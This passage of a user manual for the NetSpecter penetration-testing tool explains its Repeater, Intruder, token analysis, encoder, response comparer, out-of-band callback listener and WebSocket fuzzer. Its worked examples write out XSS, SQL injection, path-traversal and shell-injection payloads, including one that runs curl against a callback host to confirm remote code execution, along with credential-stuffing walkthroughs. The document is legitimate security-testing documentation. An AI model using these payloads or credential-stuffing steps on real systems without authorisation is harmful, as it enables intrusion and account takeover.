| 5 | `%68%74%74%70%73://evil-redir.netspectre.test` | URL-encoded scheme |
| 6 | `%2568%2574%2574%2570%2573://evil-redir.netspectre.test` | Double URL-encoded |
| 7 | `https://evil-redir.netspectre.test%09/phish` | Tab-encoded path separator |
| 8 | `https://target.com@evil-redir.netspectre.test/phish` | `@`-sign authority confusion |

A redirect is confirmed when either:

- The HTTP response `Location` header redirects to the probe domain (not the original target domain)
- The response body contains a JavaScript `window.location` assignment or a `<meta http-equiv="refresh">` pointing to the probe domain

Findings are deduplicated per parameter — only one finding is emitted per confirmed-vulnerable parameter, using the first successful bypass technique as the evidence.

#### Send to Repeater

Click **Send to Repeater** on any finding to open the exact triggering request in Repeater for manual follow-up.

#### Network Badge

When a scanner finding involves a host that is also in the Network workspace, a `.web-vuln-badge` is automatically injected onto that host's card in the Network tab — creating a visual link between web-layer findings and network-layer hosts.

#### Exporting Results

Click **Export** and choose:

- **JSON** — full findings array with all fields, suitable for programmatic processing. Contains: severity, module, URL, parameter, evidence (full request/response), description, remediation, references, timestamp.
- **CSV** — one finding per row (severity, title, URL, parameter, evidence). Opens in Excel/Google Sheets for filtering and sorting.
- **HTML Report** — styled standalone report with severity-grouped sections and remediation guidance. Suitable for client delivery as an appendix to a penetration test report.

---

### 19D. Request Repeater

The Repeater lets you manually modify and retransmit any HTTP request, bypassing browser CORS restrictions entirely.

#### When Repeater Is More Useful Than the Proxy

| Scenario | Better Tool |
| --- | --- |
| Observing normal application behavior | Proxy — passive capture |
| Modifying a single parameter and resending | **Repeater** — faster iteration |
| Testing authentication bypass (changing tokens, user IDs) | **Repeater** — full control over headers |
| Testing IDOR by swapping identifiers | **Repeater** — per-tab history lets you compare |
| Automated payload testing | Intruder (Section 19E) |

#### Opening Repeater

- Right-click any row in the Proxy History table then **Send to Repeater**
- Right-click any sitemap endpoint then **Send to Repeater**
- Click **Send to Repeater** from any Scanner finding
- Click the **+** button in the Repeater tab to open a blank request

#### Editing a Request

The left pane contains a raw HTTP request editor:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer eyJ...

{"username":"admin","password":"test"}
```

##### Raw HTTP Format Requirements

The raw request must follow HTTP/1.1 format:

```text
METHOD SP PATH SP HTTP/1.1 CRLF
Header-Name: Header-Value CRLF
Header-Name: Header-Value CRLF
CRLF
Body (if present)
```

- **Method:** Any valid HTTP method (GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD)
- **Path:** Must include the leading `/` and any query string
- **Headers:** One per line, `Name: Value` format
- **Blank line:** Separates headers from body (required even if body is empty)
- **Body:** Everything after the blank line

##### Content-Length Header

When you modify the request body, you should update the `Content-Length` header to match the new body size. If `Content-Length` is wrong:
- **Too short:** The server may truncate the body and parse incomplete data
- **Too long:** The server may hang waiting for more data, eventually timing out
- **Missing:** Most servers will either reject the request or read until connection close

> **Tip:** NetSpecter does not auto-update `Content-Length`. When changing the body, manually count the bytes or delete the `Content-Length` header entirely — many servers will use chunked transfer or read-to-close.

Edit any field — method, path, headers, or body — and click **Send**. The right pane shows the response:

- Raw HTTP response headers
- Response body (syntax-highlighted for JSON/HTML/XML)
- Status code, response size, and round-trip time

#### HTTPS Direct Requests

Repeater sends requests directly via Node.js — no browser involved. TLS certificate validation can be toggled per-tab (for testing self-signed or expired certificates without changing global settings). This means:

- No CORS restrictions — you can send any request to any origin
- No cookie jar — you manually control all cookies via headers
- No JavaScript execution — you see the raw server response

#### Per-Tab History

Each Repeater tab maintains its own history. Use the **Back** and **Forward** buttons to navigate through previous requests in that tab. This allows you to compare responses across multiple manual modifications. Approximately 50 request/response pairs are kept per tab.

#### Multiple Tabs

Click **+ New Tab** to open additional independent Repeater sessions. Each tab maintains its own state, history, and target host settings. Organize tabs by:

- **Target endpoint:** One tab per API endpoint being tested
- **Attack type:** One tab for SQLi testing, one for authentication bypass
- **Comparison:** Two tabs for the same endpoint with different parameters (e.g., user ID 1 vs user ID 2)

#### Response Analysis Tips

When analyzing responses, check in this order:

1. **Status code** — did it change from the baseline? A 200 becoming a 500 may indicate injection.
2. **Response size** — significant size differences suggest different code paths were triggered.
3. **Timing** — a 5-second delay where baseline is 200ms suggests time-based blind injection.
4. **Body content** — look for error messages, stack traces, SQL errors, or reflected input.
5. **Set-Cookie headers** — new cookies may indicate session manipulation success.

> **Worked example: Testing IDOR.** You intercept a request to `GET /api/users/42/profile` that returns your own profile. Open it in Repeater. Change `42` to `43` and click Send. If the response returns a different user's profile with the same 200 status, you have confirmed an IDOR (Insecure Direct Object Reference) vulnerability. Compare the two responses in the Comparer (Section 19H) to confirm the data belongs to a different user.

---

### 19E. Intruder

Intruder automates customizable fuzzing attacks against HTTP endpoints — similar to Burp Suite Intruder.

#### When to Use Intruder vs. Scanner

| Scenario | Better Tool |
| --- | --- |
| Broad vulnerability discovery across many endpoints | **Scanner** — automated, covers OWASP Top 10 |
| Custom payloads against a specific parameter | **Intruder** — full control over payloads and positions |
| Credential stuffing with known username/password lists | **Intruder** (Cluster Bomb or Pitchfork) |
| Testing WAF bypass techniques | **Intruder** — use custom bypass payloads |
| Fuzzing API parameters with edge-case values | **Intruder** — manual payload list |

#### Setting Up a Request Template

Open a request in Intruder (from Proxy History right-click, Sitemap, or Scanner finding). The raw request appears in the template editor.

#### Marking Positions

Highlight any value in the request template and click **Add position marker** to wrap it with position markers:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"§admin§","password":"§password§"}
```

Each `§value§` pair is an injection position. The original value between markers is preserved as a placeholder.

##### Clearing Positions

To remove position markers, click **Clear All Positions** to remove all markers at once, or manually delete the `§` characters from the template.

#### Choosing an Attack Type

| Attack Type | Behavior | Use Case |
| --- | --- | --- |
| **Sniper** | One payload list; iterates through each position independently | Username/password field testing, one variable at a time |
| **Battering Ram** | One payload list; same payload applied to all positions simultaneously | Session token or shared-value fuzzing |
| **Pitchfork** | Multiple payload lists; applies list[n] to position[n] in parallel | Credential pairs (username list + matching password list) |
| **Cluster Bomb** | Multiple payload lists; tests every combination (Cartesian product) | Full credential stuffing |

##### Sniper -- Worked Example

Testing for XSS in a search parameter:

```http
GET /search?q=§test§ HTTP/1.1
Host: target.com
```

Payload list:
```text
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

Sniper sends 4 requests, one per payload, replacing the `§test§` position each time.

##### Battering Ram -- Worked Example

Testing all headers simultaneously with the same SSRF payload:

```http
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-For: §127.0.0.1§
X-Real-IP: §127.0.0.1§
X-Original-URL: §127.0.0.1§
```

Battering Ram sends one request per payload, replacing ALL positions with the same value simultaneously.

##### Pitchfork -- Worked Example

Credential stuffing with matched username/password lists:

Position 1 payloads (usernames): `admin`, `john`, `jane`
Position 2 payloads (passwords): `admin123`, `john2024`, `jane!pass`

Pitchfork sends 3 requests: `admin/admin123`, `john/john2024`, `jane/jane!pass`. Each row from list 1 is paired with the corresponding row from list 2.

##### Cluster Bomb -- Worked Example

Testing all combinations of username and password for a login form:

Position 1 payloads (usernames): `admin`, `root`, `user`
Position 2 payloads (passwords): `password`, `admin`, `123456`

Cluster Bomb sends 9 requests (3 x 3): every username is tested with every password. This is the Cartesian product.

#### Configuring Payloads

For each position (or for the shared list, depending on attack type):

- **Manual list** — type or paste payloads one per line
- **Built-in wordlists** — select from NetSpecter's bundled lists:
  - `basicauth.txt` — common username/password combinations
  - `sqli-payloads.txt` — SQL injection strings including time-based blind, error-based, and UNION-based payloads
  - `xss-payloads.txt` — XSS payloads including basic alerts, event handlers, encoded variants, and bypass techniques
- **Load file** — browse to a custom `.txt` wordlist

#### Running the Attack

- Set **Concurrency** (1-20 simultaneous requests) and **Request Timeout**
- Click **Start Attack**

Results stream into the table as requests complete:

| Column | Description |
| --- | --- |
| **#** | Request index |
| **Payload** | Payload(s) used |
| **Status** | HTTP response status code |
| **Length** | Response body size in bytes |
| **Duration** | Round-trip time in milliseconds |
| **Delta** | Response size difference from baseline |

#### Analysing Results

Sort by **Length** or **Delta** to spot anomalous responses that may indicate a successful injection or authentication bypass. Click any row to see the full response in the detail pane.

##### How the Delta Column Is Calculated

The Delta column shows the difference in response body size compared to the **first request** in the attack run. This first request serves as the baseline. For example:

- Request 1: 1500 bytes (baseline) — Delta = 0
- Request 2: 1500 bytes — Delta = 0
- Request 3: 2300 bytes — Delta = **+800** (anomaly)
- Request 4: 1500 bytes — Delta = 0

Request 3 is the anomaly — its response was 800 bytes larger than the baseline. This could indicate that the payload triggered a different code path (successful login, SQL error with stack trace, or reflected content).

> **Worked example: Credential stuffing with Cluster Bomb.** You intercept a POST to `/api/login` with body `{"email":"§test@test.com§","password":"§password§"}`. Set attack type to Cluster Bomb. Position 1: load a list of 10 email addresses. Position 2: load a list of 20 common passwords. Intruder sends 200 requests (10 x 20). Sort results by Length. All responses are 85 bytes except one: `admin@target.com` / `Password1!` returned 342 bytes. Click to see the response — it contains a session token. Credential stuffing successful.

---

### 19F. Token Sequencer

The Token Sequencer analyzes the randomness quality of session tokens, CSRF tokens, API keys, and any other string values generated by the server.

#### What Token Predictability Means for Security

If a server generates session tokens with low entropy (predictable patterns), an attacker can:

- **Session fixation** — predict or forge a valid session token to hijack another user's session
- **CSRF bypass** — predict CSRF tokens to craft valid cross-site request forgery attacks
- **Account takeover** — if password reset tokens are predictable, an attacker can guess valid tokens and take over accounts

Truly random tokens make these attacks computationally infeasible. The Sequencer helps you verify that the target's token generation is cryptographically secure.

#### Capturing Tokens

1. In the Sequencer tab, configure the **Token Source**:
   - Paste a sample response that contains the token
   - Or send a request from Proxy History that generates a token
2. Identify the **Token Location** using the extraction editor:
   - **Cookie name** (e.g., `PHPSESSID`) — extracts the value of the named cookie from `Set-Cookie` headers
   - **Response header name** — extracts the value of a specific response header (e.g., `X-CSRF-Token`)
   - **JSON path** (e.g., `$.token`) — extracts a value from a JSON response body
   - **Regex pattern** — custom regex with a capture group for complex extraction

#### Collecting Samples

Click **Start Capture** — Sequencer repeatedly requests the configured endpoint and extracts a token from each response. The default sample count is 100 tokens; increase to 1000+ for more accurate statistical results.

##### Sample Count Guidance

| Sample Count | Accuracy | Use Case |
| --- | --- | --- |
| 100 | Quick estimate — may miss subtle patterns | Fast check during a time-limited assessment |
| 500 | Good accuracy for most token types | Standard recommendation for initial analysis |
| 1000+ | High statistical confidence — reliable FIPS test results | When you need to prove a finding in a report |
| 5000+ | Research-grade accuracy | Academic analysis or extremely subtle pattern detection |

#### Analysis Results

Once collection is complete, click **Analyze** to run statistical tests:

- **Entropy estimate** — bits of effective entropy (aim for >= 64 bits for security)
- **Bit-level entropy chart** — per-bit entropy visualization; flat lines indicate predictable bit positions
- **FIPS 140-2 Tests**:
  - Monobit: proportion of 1-bits (should be ~50%)
  - Poker: distribution of 4-bit groups (chi-squared)
  - Runs: counts of consecutive identical bits
  - Long Runs: maximum run length (should be <= 25)
- **Overall verdict**: Pass / Marginal / Fail with explanation

##### Interpreting Analysis Output

| Metric | Good Result | Bad Result | What Bad Means |
| --- | --- | --- | --- |
| **Entropy >= 64 bits** | Tokens are unpredictable | Entropy < 32 bits | Tokens can be brute-forced in feasible time |
| **Bit-level chart: uniform** | All bits contribute to randomness | Flat lines at specific bit positions | Those bit positions are always 0 or 1 — the token has fixed structure |
| **FIPS Monobit: Pass** | Balanced 0/1 ratio | Fail | The PRNG is biased toward 0s or 1s |
| **FIPS Poker: Pass** | Uniform 4-bit group distribution | Fail | The PRNG has non-uniform output distribution |
| **FIPS Runs: Pass** | Expected run-length distribution | Fail | The PRNG has sequential patterns |
| **FIPS Long Runs: Pass** | No excessively long runs | Fail (run > 25) | A long sequence of identical bits indicates a structural flaw |

##### Verdict Interpretation

| Verdict | Meaning | Action Required |
| --- | --- | --- |
| **Pass** | Token generation is cryptographically strong | No action — document as "secure token generation" |
| **Marginal** | Some tests are borderline — may indicate weak PRNG | Collect more samples for confirmation. If Marginal persists with 1000+ samples, report as medium finding |
| **Fail** | Token generation is statistically predictable | Critical finding — tokens may be forgeable. Report immediately with the specific failing tests as evidence |

A "Fail" verdict means the token generation is statistically predictable and tokens may be forgeable.

> **Worked example:** You analyze PHP session IDs (`PHPSESSID`) from a legacy PHP 5.x application. Set the token source to the login response, cookie name `PHPSESSID`. Collect 1000 samples. Analysis shows entropy of 48 bits (below the 64-bit threshold), and the bit-level chart shows the first 16 bits are always identical (they correspond to the server's process ID). The FIPS Monobit test fails. Verdict: Fail. You document this as a High-severity finding: session tokens are predictable and an attacker could brute-force valid session IDs within hours.

---

### 19G. Encoder / Decoder

A multi-format encoding, decoding, and hashing toolbox — no IPC required, runs entirely in the browser.

#### When Each Encoding Is Used

| Encoding | Common Security Context |
| --- | --- |
| **URL encoding** | Used in URL query parameters and form bodies. XSS and SQLi payloads must be URL-encoded to pass through URL parsers. |
| **HTML encoding** | Used in HTML output contexts. WAFs may decode HTML entities before matching, so double-encoding can bypass filters. |
| **Base64** | Used in `Authorization: Basic` headers, JWT tokens, data URIs. Many APIs use Base64 for binary data transport. |
| **Hex** | Used in shellcode, binary exploitation, and some WAF bypass techniques. |

#### Using the Toolbox

1. Paste any input into the text area
2. Click an operation from the toolbar:

   | Operation | Description |
   | --- | --- |
   | URL Encode | `%XX` encoding for URL contexts |
   | URL Decode | Decode `%XX` sequences |
   | HTML Encode | Convert `<`, `>`, `&`, `"` to HTML entities |
   | HTML Decode | Reverse HTML entity encoding |
   | Base64 Encode | Standard Base64 |
   | Base64 Decode | Base64 decode (handles padding) |
   | Hex Encode | Convert each byte to `\xNN` hex |
   | Hex Decode | Decode hex string |
   | MD5 | 128-bit hash |
   | SHA-1 | 160-bit hash |
   | SHA-256 | 256-bit hash |
   | SHA-512 | 512-bit hash |
   | GZIP Decompress | Decompress a GZIP blob |

3. The result appears in the output area immediately
4. Click **Copy** to copy the result to clipboard

#### Smart Decode

Click **Smart Decode** to automatically detect and peel encoding layers. The algorithm tries decodings in order:

1. URL decode (if `%` sequences detected)
2. Base64 decode (if the string matches Base64 character set and length is divisible by 4)
3. HTML entity decode (if `&` sequences detected)
4. Hex decode (if `\x` or `0x` prefixes detected)

Each successful decoding is applied, and the algorithm repeats until no more layers can be peeled. Useful for multi-encoded values commonly used in XSS or bypass payloads (e.g., double-URL-encoded, Base64-encoded-then-URL-encoded).

#### Chaining Operations

Click **Use Output as Input** to chain multiple operations. For example: `Hex Encode` then `Base64 Encode` produces a double-encoded representation.

##### Step-by-Step Chaining Example

Starting with: `<script>alert(1)</script>`

1. Click **URL Encode**: `%3Cscript%3Ealert(1)%3C/script%3E`
2. Click **Use Output as Input**
3. Click **Base64 Encode**: `JTNDc2NyaXB0JTNFYWxlcnQoMSklM0Mvc2NyaXB0JTNF`
4. This double-encoded payload may bypass WAF rules that only check for one layer of encoding

#### Hash Uses in Security Testing

- **MD5 / SHA-1** — compare hashes to verify file integrity, identify known malware, or check if two responses have identical content
- **SHA-256** — used in JWT signatures, certificate fingerprints, and Subresource Integrity (SRI) checks
- **Comparing hashes** — if you have a known password hash from a database dump, you can hash candidate passwords to find matches

> **Worked example: Decoding a multi-encoded XSS payload.** You find a parameter value in the proxy history that looks suspicious: `JTI1M0NzY3JpcHQlMjUzRWFsZXJ0KDEpJTI1M0MlMjUyRnNjcmlwdCUyNTNF`. Paste it into the Encoder and click **Smart Decode**. Layer 1 (Base64): `%253Cscript%253Ealert(1)%253C%252Fscript%253E`. Layer 2 (URL decode): `%3Cscript%3Ealert(1)%3C%2Fscript%3E`. Layer 3 (URL decode): `<script>alert(1)</script>`. Three layers of encoding were hiding an XSS payload. The WAF missed it because it only decoded one layer.

---

### 19H. Response Comparer

Compare two HTTP responses side-by-side to spot subtle differences — invaluable for detecting boolean-based injection, username enumeration, or access control differences.

#### When Comparer Reveals What Other Tools Miss

The Comparer excels when the difference between a vulnerable and non-vulnerable response is subtle — a single word, a few bytes, or a different header value. Automated scanners may miss these differences, but a visual side-by-side comparison makes them immediately obvious.

#### Loading Responses

There are three ways to populate the two comparison panes:

- **From Proxy History** — right-click any history row and select **Send to Comparer (Left)** or **Send to Comparer (Right)**
- **From Repeater** — click **Send to Comparer** in the Repeater response pane
- **Paste manually** — click the **Edit** button in either pane and paste any text

##### How to Load Two Responses Systematically

1. In the Repeater, send the baseline request (e.g., `AND 1=1`). Click **Send to Comparer (Left)**.
2. Modify the payload (e.g., `AND 1=2`). Send again. Click **Send to Comparer (Right)**.
3. Switch to the Comparer tab — both responses are loaded and the diff is computed automatically.

#### Comparison Modes

- **Word-level** — highlights individual changed words; best for readable text like HTML or JSON. Use this for most web application responses.
- **Byte-level** — highlights every changed character; best for binary or compressed data. Use this when word-level diff shows too many changes (e.g., minified JavaScript).

#### Reading the Diff

- **Green highlight** — content present in the right pane but not the left (added)
- **Red highlight** — content present in the left pane but not the right (removed)
- **No highlight** — identical content
- The **Summary bar** at the top shows total added/removed/changed token counts

##### What to Ignore (Noise)

- **Timestamps** — most responses include a `Date:` header or a timestamp in the body. These always differ.
- **CSRF tokens** — regenerated on each request. Different by design.
- **Request IDs / Correlation IDs** — unique per request.
- **Cache headers** — `ETag`, `Last-Modified` may change.

##### What to Look For (Signal)

- **Different body content** with the same status code — indicates a different code path was triggered
- **Different status codes** — 200 vs 403 indicates access control differences
- **Different response sizes** — even a few bytes difference can indicate boolean-based injection
- **Error messages appearing/disappearing** — indicates input validation differences

> **Tip:** Before opening the Comparer, check the **Length** column in the proxy history or Intruder results. If two responses have significantly different lengths, that alone may be enough to confirm a finding without detailed comparison.

#### Use Cases Expanded

##### Boolean SQL Injection Confirmation

1. Send `parameter=1' AND 1=1--` (true condition) then Comparer Left
2. Send `parameter=1' AND 1=2--` (false condition) then Comparer Right
3. If the responses differ (e.g., data is present in Left but absent in Right), boolean-based SQLi is confirmed

##### Username Enumeration

1. Submit a login with a **valid** username and wrong password then Comparer Left
2. Submit a login with an **invalid** username and wrong password then Comparer Right
3. Any difference (different error message, different response size, different timing) confirms user enumeration

##### IDOR Detection

1. Request `/api/users/1/profile` as user 1 then Comparer Left
2. Request `/api/users/2/profile` as user 1 then Comparer Right
3. If both return 200 with different user data, IDOR is confirmed

##### Access Control Testing

1. Request `/admin/dashboard` with admin session token then Comparer Left
2. Request `/admin/dashboard` with regular user session token then Comparer Right
3. If both return 200 with similar content, broken access control is confirmed

> **Worked example: Confirming boolean-based SQL injection.** You suspect a search parameter is vulnerable. In Repeater, send `GET /search?q=test' AND 1=1--`. Response: 200, 4523 bytes, shows search results. Send to Comparer Left. Send `GET /search?q=test' AND 1=2--`. Response: 200, 1247 bytes, shows "No results found." Send to Comparer Right. The Comparer highlights the entire search results section as removed in the Right pane. The `AND 1=1` (true) returns data, the `AND 1=2` (false) returns nothing — classic boolean-based SQLi confirmed. Document the finding with both responses as evidence.

---

### 19I. OAST — Out-of-Band Callback Listener

OAST (Out-of-Band Application Security Testing) is the technique of confirming blind vulnerabilities by making the target server initiate an outbound network connection to a callback URL that you control. This is the gold standard for confirming SSRF, XXE, blind Command Injection, and blind GraphQL injection — vulnerabilities that produce no visible output in the HTTP response.

> **When to use OAST:** Use OAST when the scanner's in-band probes (response analysis, timing) are inconclusive, or when testing over-the-LAN targets that cannot reach the internet. Because the OAST server binds on all interfaces (`0.0.0.0`), any target on the same LAN segment as your machine can reach the callback URL.

#### Setting Up the OAST Listener

1. In the Web App workspace, click **📡 OAST** in the left sidebar
2. The OAST panel opens, showing the configuration strip at the top

##### Selecting the Callback Interface

The **Callback Interface** dropdown is populated at startup with all non-internal IPv4 network interfaces detected on your machine. Each entry shows the interface name and its IP address, for example:

- `Ethernet (192.168.1.10)` — your LAN adapter
- `tun0 (10.8.0.5)` — a VPN or lab tunnel
- `All interfaces (0.0.0.0)` — auto-detect (uses the first non-internal IP found)

**Select the interface whose IP is reachable by your target.** For example:

- If your target is on the same LAN, select your Ethernet or Wi-Fi adapter
- If your target is behind a VPN, select your VPN tunnel interface
- If you are unsure, leave it on "All interfaces (0.0.0.0)" — NetSpecter will auto-detect

The selected IP becomes the base of all generated callback URLs (e.g., `http://192.168.1.10:7331/oast/{token}`). The server itself always binds on all interfaces regardless of this selection.

##### Setting the Port

The default listener port is **7331**. Change it to any value between 1025 and 65534. Make sure no firewall rule blocks inbound TCP on this port from the target host.

##### Starting the OAST Listener

Click **▶ Start**. The status badge changes to **● Listening** and the full callback URL template appears below the controls, for example:

```text
Listening at http://192.168.1.10:7331/oast/{token}
```

The interface dropdown and port field are disabled while the listener is running. Click **⏹ Stop** to shut down the server.

#### Generating Probe Tokens

Probe tokens are the mechanism for correlating which scanner payload triggered which callback.

1. In the **Generate probe URL** row, optionally type a label in the **Label / context** field (e.g., `xxe-test`, `ssrf-aws`, `sqli-outband`). Labels help you identify findings in the callbacks table.
2. Click **Generate Token** — a unique 24-character hex token is allocated and the full callback URL appears in the output field:

   ```text
   http://192.168.1.10:7331/oast/a3f8c12e9b04d7a1fe2c5d89
   ```

3. Click **📋** to copy the URL to clipboard
4. Paste this URL into your target payload — in a request body parameter, a URL field, an XML entity, a GraphQL argument, etc.

#### Reading the Callbacks Table

When the target application makes an HTTP request to any `http://<your-ip>:7331/oast/<token>` URL:

- A new row is **prepended** to the callbacks table (newest first)
- The row shows: **Time**, **Remote IP** (the source IP of the callback — the target server), **Method** (usually GET), and the **Context** (your label + shortened token)

If the remote IP is an internal cloud address (e.g., `169.254.169.254`, `metadata.google.internal`), it confirms SSRF to a cloud metadata endpoint. If it is the target's own IP, it confirms the server is executing your payload. If it is an unexpected IP, the target may be using a reverse proxy — investigate the infrastructure.

The callback count is shown in the toolbar. Click **Clear** to reset the table and release all allocated tokens.

#### Using OAST with the Active Scanner

When the OAST listener is running, the Active Vulnerability Scanner automatically uses it for blind confirmation probes in the following modules:

| Scanner Module | How OAST Is Used |
| --- | --- |
| **SSRF** | Embeds the OAST callback URL as the value in URL, hostname, and `Host` header probes. A callback confirms the server fetched the URL server-side. |
| **XXE** | Injects an XML external entity declaration that fetches the OAST URL via HTTP. A callback confirms the XML parser is resolving external entities. |
| **Command Injection** | Appends a `curl <oast-url>` or `wget <oast-url>` payload. A callback confirms OS-level command execution. |
| **GraphQL** | Embeds the OAST URL in a resolver argument. A callback via the GraphQL server confirms blind SSRF or server-side injection through the GraphQL layer. |

You do not need to do anything special to enable this — start the OAST listener before running a scan and it is used automatically.

#### Advanced: Manual OAST Injection Workflow

For targets that cannot be reached by the automatic scanner (e.g., targets you interact with manually through the Repeater):

1. Start the OAST listener and generate a token with a descriptive label (e.g., `repeater-xxe-test`)
2. Copy the callback URL
3. In the Repeater, craft an XXE or SSRF payload containing the callback URL
4. Send the request and watch the OAST callbacks table
5. If a callback arrives, you have confirmed blind exploitation. The remote IP shows you whether the callback came directly from the target or through an intermediary (reverse proxy, WAF, cloud egress NAT, etc.)

---

### 19J. WebSocket Fuzzer

The WebSocket Fuzzer sends a configurable list of payloads over real WebSocket connections, detecting error patterns, timing anomalies, and upgrade failures that indicate injection vulnerabilities in WebSocket message handlers.

> **No external dependencies required.** The fuzzer implements the complete RFC 6455 WebSocket protocol using only Node.js `net` and `tls` modules — masking, frame encoding, variable-length payload headers (7-bit, 16-bit, and 64-bit), and connection upgrade are all handled natively.

#### Opening the WebSocket Fuzzer

**Method 1 — From the sidebar:**

1. Switch to the **Web App** workspace (click the Web App tab at the top)
2. Click **🔌 WS Fuzz** in the left sidebar

**Method 2 — From the Network workspace:**
When you find a host with an HTTP port open (80, 443, 8080, 8443, etc.), right-click the port or use the **Dir Fuzz** action button and the WS Fuzzer can be opened pre-populated with that host's URL converted to `ws://` or `wss://`.

**Method 3 — Programmatic pivot:**
`window.__openWsFuzzerPanel('https://target.com')` — called automatically by the Scanner or Sitemap when a WebSocket endpoint is detected. The URL is converted from `https://` to `wss://` or from `http://` to `ws://` automatically.

#### Configuring the Fuzzer

##### Target URL

Enter the WebSocket endpoint URL. Must use the `ws://` or `wss://` scheme:

- `ws://target.com/ws` — plain WebSocket
- `wss://target.com/socket` — WebSocket over TLS (self-signed certificates are accepted)

If you paste an `http://` or `https://` URL (e.g., from the proxy history), the scheme is automatically converted.

##### Payloads

Two payload source modes are available, toggled by radio button:

**Manual (textarea):**
Type or paste one payload per line in the text area. Useful for targeted injection strings:

```text
' OR '1'='1
<script>alert(1)</script>
{"$gt": ""}
../../etc/passwd
; ls -la
```

**File:**
Click **Browse** and select a `.txt` wordlist (one payload per line). Files up to hundreds of thousands of entries are supported. The fuzzer streams through the list with the configured concurrency — memory usage stays flat regardless of file size.

##### Concurrency

The **Connections** slider (1–20, default 5) controls how many simultaneous WebSocket connections are maintained. Each slot:

1. Opens a TCP (or TLS) socket
2. Performs the full HTTP Upgrade handshake
3. Sends one payload frame
4. Waits for the server's response frame
5. Closes the connection

Set concurrency low (2–3) for targets that rate-limit or close sockets aggressively. Higher concurrency (10–20) is suitable for local lab targets.

##### Timeout

Per-connection timeout in milliseconds (default 8000 ms / 8 seconds). This covers both the upgrade handshake and the wait for a response frame. Connections that exceed this limit are recorded as timing anomalies — useful for detecting time-based blind injection.

##### Extra Headers

The **Extra Headers (JSON)** field accepts an optional JSON object of additional HTTP headers to include in the WebSocket Upgrade request. Useful for:

- Adding `Authorization` headers for authenticated endpoints:

  ```json
  {"Authorization": "Bearer eyJ..."}
  ```

- Setting `Cookie` headers to maintain session state:

  ```json
  {"Cookie": "session=abc123; csrf=xyz"}
  ```

- Adding application-specific headers required by the target's WebSocket server

#### Running the WebSocket Fuzz

Click **▶ Start Fuzzing**. The progress bar fills as payloads complete. The **Hits** counter increments for each anomalous response (error pattern detected, upgrade rejected, or timeout).

Click **⏹ Stop** at any time to abort remaining payloads. Already-in-flight connections complete naturally; queued connections are cancelled.

#### Reading the Results Table

Each row in the results table corresponds to one payload:

| Column | Description |
| --- | --- |
| **#** | Payload index (1-based) |
| **Payload** | The exact string sent over the WebSocket |
| **Response** | The server's response text (first frame body, truncated to 200 chars) |
| **ms** | Round-trip time from payload send to response frame receipt |
| **Status** | Badge indicating the result type |

##### Status Badges

| Badge | Meaning |
| --- | --- |
| **Error** (red) | Response matched one of the 8 error patterns (Java exception, SQL error, JS error, Python traceback, PHP warning, internal server error, DB access denied, PHP undefined variable) |
| **Timeout** (orange) | No response frame received within the timeout period — possible time-based blind injection |
| **No Upgrade** (orange) | Server rejected the WebSocket Upgrade handshake (`101 Switching Protocols` not received) |
| **OK** (green / default) | Server accepted the upgrade and returned a response frame without triggering any anomaly patterns |

##### Filtering to Anomalies

Toggle the **Anomalies only** checkbox to hide all non-anomalous rows. This brings the signal out of the noise when fuzzing with large wordlists, so you can focus on the payloads that caused unusual server behavior.

#### Analyzing Findings

**Error pattern hit (red badge):**
The server's response message reveals implementation details. A "You have an error in your SQL syntax" response to a WebSocket message means the WebSocket handler is passing message content directly into a SQL query — treat this as a critical SQLi finding. Send the triggering payload to Repeater for manual follow-up.

**Timeout (orange badge):**
If a payload consistently causes the server to take significantly longer than others, a time-based blind vulnerability may be present. Compare the duration of a benign payload (e.g., `hello`) versus the anomalous one. A consistent 5-second delay for `'; WAITFOR DELAY '0:0:5'--` confirms time-based SQL injection.

**No Upgrade (orange badge):**
Some payloads in the URL path or query string can trigger server-side validation errors before the WebSocket upgrade completes. This is still a useful finding — it indicates the server is processing your input before allowing the connection.

**Normal responses (green):**
Review the Response column even for non-anomalous results. Reflected content, internal path disclosures, or verbose error structures can appear in normal-looking WebSocket responses.

#### Exporting WebSocket Fuzz Results

Click **Export CSV** to download the full results table as a CSV file with columns: index, payload, response, duration_ms, upgraded, error_type, timed_out, anomaly. This file can be imported into spreadsheet tools for bulk analysis or included in a pentest report.

#### Example: Testing a Chat Application for Command Injection

A target application uses WebSockets for its chat feature. You suspect the message handler passes user input to a shell command.

1. Open the WebSocket Fuzzer and enter `wss://target.com/chat`
2. Add the header `{"Cookie": "session=your-valid-session-token"}`
3. Select **Manual** payloads and enter:

   ```text
   hello
   ; id
   `id`
   $(id)
   ' && id && echo '
   | id
   ```

4. Set concurrency to 2 (to avoid flooding the chat server)
5. Click **Start Fuzzing**
6. If any payload returns a response containing `uid=` or `www-data`, command injection is confirmed
7. Combine with the OAST listener: add `; curl http://192.168.1.10:7331/oast/<token>` as a payload — a callback confirms blind RCE even when the response doesn't reflect output

---

## 20. Persisting & Sharing Session Data

### Saving a Session

Click **Save Results** in the top control bar. NetSpecter serializes the complete current state to a JSON file:

- All discovered hosts, open ports, OS fingerprints, and vendor data
- Deep scan results, service banners, and SSL certificate details
- All discovered CVEs from Nmap vuln scans
- Hardening Monitor delta history
- SNMP walk results
- Cloud enumeration findings

Select the output path in the native file dialog and click **Save**.

#### What Is and Is Not Saved

| Saved in Session JSON | NOT Saved in Session JSON |
| --- | --- |
| Host list (IPs, MACs, vendors, OS) | Proxy request history (stored in SQLite separately) |
| Open ports and service banners | Captured credentials (memory-only, intentionally not saved) |
| SSL/TLS certificate details | Active scan state (running scans are not resumable) |
| CVE findings from Nmap vuln scans | OAST listener state and callback history |
| SNMP walk results | WebSocket fuzzer results |
| Cloud enumeration findings | Intruder attack results |
| Hardening Monitor delta history | Metasploit session state |
| Blacklist entries | Reverse shell sessions |
| Topology graph layout | Brute force / credential spray results |
| Scanner findings (web app) | Raw Nmap terminal output |

### Loading a Session

Click **Load Results** in the top control bar. Browse to a previously saved JSON file and open it. NetSpecter re-instantiates the exact saved state — all host cards, port data, and findings are restored without rescanning.

> **Note:** Proxy request history (the SQLite database) is stored separately in your OS application data directory and persists automatically between app restarts. It is not included in the JSON session file.

#### Proxy History SQLite Location

| OS | Database Path |
| --- | --- |
| **Windows** | `%APPDATA%\netspectre\proxy-history.db` |
